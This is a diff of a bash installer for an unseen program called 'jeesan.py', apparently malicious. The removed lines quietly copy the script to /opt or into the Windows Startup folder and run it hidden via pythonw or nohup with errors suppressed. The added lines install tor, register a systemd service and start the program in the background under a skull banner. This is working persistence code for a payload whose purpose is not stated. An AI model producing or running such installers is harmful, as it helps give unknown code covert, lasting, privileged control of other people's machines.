@@ -1,29 +1,28 @@
-OS="$(uname -s)"
-SCRIPT="$(cd "$(dirname "$0")" && pwd)/jeesan.py"  
+#!/bin/bash
+set -e
 
-if [[ "$OS" == Linux* ]]; then
-    sudo cp "$SCRIPT" /opt/jeesan.py 2>/dev/null
-    sudo nohup python3 /opt/jeesan.py > /dev/null 2>&1 &
-    sudo systemctl enable jeesan.service 2>/dev/null
-    sudo systemctl start jeesan.service 2>/dev/null
-elif [[ "$OS" == MINGW* || "$OS" == MSYS* || "$OS" == CYGWIN* ]]; then
-    WINSCRIPT="C:/Users/Public/jeesan.py"
-    cp "$SCRIPT" "$WINSCRIPT" 2>/dev/null
+echo "[🔥] JEESAN CORE – Installing..."
 
-    STARTUP_DIR="$APPDATA/Microsoft/Windows/Start Menu/Programs/Startup"
-    if [ -d "$STARTUP_DIR" ]; then
-        cp "$WINSCRIPT" "$STARTUP_DIR/jeesan.py" 2>/dev/null
-    fi
-
-    if command -v pythonw > /dev/null; then
-        echo "[+] Launching via pythonw..."
-        start "" pythonw "$WINSCRIPT"
-    else
-        echo "[+] Launching via python..."
-        start "" python "$WINSCRIPT"
-    fi
-else
-    echo "Unsupported OS. Run jeesan.py manually."
-    exit 1
+if command -v apt &>/dev/null; then
+    apt update && apt install -y python3 python3-pip tor curl
+elif command -v yum &>/dev/null; then
+    yum install -y python3 python3-pip tor curl
+elif command -v pacman &>/dev/null; then
+    pacman -Sy --noconfirm python python-pip tor curl
 fi
-exit 0
+
+systemctl start tor || echo "tor not found, skipping"
+pip3 install --upgrade pip --break-system-packages 2>/dev/null || pip3 install --upgrade pip
+pip3 install -r requirements.txt --break-system-packages 2>/dev/null || pip3 install -r requirements.txt
+
+if [ -f jeesan.service ]; then
+    cp jeesan.service /etc/systemd/system/jeesan.service
+    systemctl daemon-reload
+    systemctl enable jeesan.service
+    systemctl start jeesan.service
+    echo "[✓] Service installed"
+fi
+
+chmod +x jeesan.py
+nohup python3 jeesan.py &>/dev/null &
+echo "[☠] JEESAN CORE alive – PID $!"
